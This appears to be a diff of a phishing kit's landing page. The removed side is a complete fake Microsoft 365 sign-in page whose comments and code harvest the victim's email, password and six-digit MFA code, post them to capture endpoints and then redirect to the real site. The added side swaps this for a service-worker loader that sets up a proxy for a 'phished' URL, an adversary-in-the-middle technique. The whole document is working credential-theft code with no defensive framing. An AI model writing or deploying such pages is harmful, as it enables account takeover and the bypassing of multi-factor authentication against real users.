@@ -1,177 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
-    <style>
-        /* ── ✅ MICROSOFT-STYLE LOGIN ── */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; max-width: 95%; }
-        .logo { text-align: center; margin-bottom: 25px; }
-        .logo img { height: 36px; }
-        h1 { font-size: 22px; font-weight: 400; margin-bottom: 8px; }
-        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 13px; color: #333; margin-bottom: 4px; font-weight: 500; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; transition: border 0.2s; }
-        input:focus { border-color: #0078d4; outline: none; box-shadow: 0 0 0 2px rgba(0,120,212,0.2); }
-        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: background 0.2s; }
-        button:hover { background: #005a9e; }
-        button:disabled { opacity: 0.6; cursor: not-allowed; }
-        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
-        .footer a { color: #0078d4; text-decoration: none; }
-        .error { color: #d13438; font-size: 13px; margin-top: 10px; display: none; }
-        .spinner { display: none; margin: 10px auto; width: 24px; height: 24px; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://img.icons8.com/color/48/000000/microsoft.png" alt="Microsoft">
-        </div>
-        <h1>Sign in</h1>
-        <p class="subtitle">to continue to Microsoft 365</p>
-        
-        <!-- ── ✅ FAKE LOGIN FORM ── -->
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="email">Email, phone, or Skype</label>
-                <input type="text" id="email" placeholder="Enter your email" required autofocus>
-            </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
-            <button type="submit" id="loginBtn">Next</button>
-            <div class="spinner" id="spinner"></div>
-            <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
-        </form>
-        
-        <!-- ── ✅ MFA FORM (hidden initially) ── -->
-        <form id="mfaForm" style="display:none;">
-            <div class="logo" style="margin-bottom:15px;">
-                <img src="https://img.icons8.com/color/48/000000/microsoft.png" alt="Microsoft">
-            </div>
-            <h1>Verify your identity</h1>
-            <p class="subtitle">Enter the 6-digit code from your authenticator app</p>
-            <div class="input-group">
-                <label for="mfaCode">Verification code</label>
-                <input type="text" id="mfaCode" placeholder="Enter code" maxlength="6" inputmode="numeric" required>
-            </div>
-            <button type="submit" id="mfaBtn">Verify</button>
-            <div class="error" id="mfaError">Invalid code. Please try again.</div>
-        </form>
-        
-        <div class="footer">
-            © 2026 Microsoft<br>
-            <a href="#">Privacy & Cookies</a> | <a href="#">Terms of use</a>
-        </div>
-    </div>
-
     <script>
-        // ── ✅ EXTRACT REDIRECT URI (for later use) ──
-        const urlParams = new URLSearchParams(window.location.search);
-        const REDIRECT_URI = urlParams.get('redirect_uri') || 'https://login.microsoftonline.com/';
-        const SESSION_ID = document.cookie.match(/session=([^;]+)/)?.[1] || crypto.randomUUID();
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+                scope: "/",
+            })
+                .then((registration) => {
+                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
 
-        // ── ✅ SERVICE WORKER REGISTRATION (for proxy) ──
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js', { scope: '/' })
-                .then(() => console.log('✅ SW registered'))
-                .catch(err => console.warn('SW failed:', err));
+                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
+                })
+                .catch((error) => {
+                    console.error(`Service worker registration failed: ${error}`);
+                });
         }
-
-        // ── ✅ CAPTURE CREDENTIALS ──
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                document.getElementById('errorMsg').style.display = 'block';
-                return;
-            }
-            document.getElementById('errorMsg').style.display = 'none';
-            document.getElementById('loginBtn').disabled = true;
-            document.getElementById('spinner').style.display = 'block';
-
-            try {
-                // Send credentials to backend
-                const response = await fetch('/api/capture/credentials', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        email, 
-                        password,
-                        sessionId: SESSION_ID,
-                        userAgent: navigator.userAgent,
-                        ip: '{{client_ip}}'  // Will be replaced by server
-                    })
-                });
-
-                // ── ✅ SHOW MFA FORM ──
-                document.getElementById('loginForm').style.display = 'none';
-                document.getElementById('mfaForm').style.display = 'block';
-                document.getElementById('mfaCode').focus();
-                
-            } catch (err) {
-                console.error('Login error:', err);
-                document.getElementById('errorMsg').textContent = 'An error occurred. Please try again.';
-                document.getElementById('errorMsg').style.display = 'block';
-            } finally {
-                document.getElementById('loginBtn').disabled = false;
-                document.getElementById('spinner').style.display = 'none';
-            }
-        });
-
-        // ── ✅ CAPTURE MFA CODE ──
-        document.getElementById('mfaForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const mfaCode = document.getElementById('mfaCode').value.trim();
-            
-            if (!mfaCode || mfaCode.length < 6) {
-                document.getElementById('mfaError').style.display = 'block';
-                return;
-            }
-            document.getElementById('mfaError').style.display = 'none';
-            document.getElementById('mfaBtn').disabled = true;
-
-            try {
-                // Send MFA code to backend
-                await fetch('/mfa/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        mfa_code: mfaCode,
-                        session_id: SESSION_ID
-                    })
-                });
-
-                // ── ✅ REDIRECT TO REAL MICROSOFT ──
-                alert('Verification successful! Redirecting...');
-                window.location.href = decodeURIComponent(REDIRECT_URI);
-                
-            } catch (err) {
-                console.error('MFA error:', err);
-                document.getElementById('mfaError').textContent = 'An error occurred. Please try again.';
-                document.getElementById('mfaError').style.display = 'block';
-            } finally {
-                document.getElementById('mfaBtn').disabled = false;
-            }
-        });
-
-        // ── ✅ AUTO-FOCUS ──
-        document.getElementById('email').focus();
-
-        // ── ✅ KEYBOARD SHORTCUT: Enter to submit ──
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && document.activeElement === document.getElementById('mfaCode')) {
-                document.getElementById('mfaForm').dispatchEvent(new Event('submit'));
-            }
-        });
+        else {
+            console.error("Service workers are not supported by this browser");
+        }
     </script>
 </body>
+
 </html>
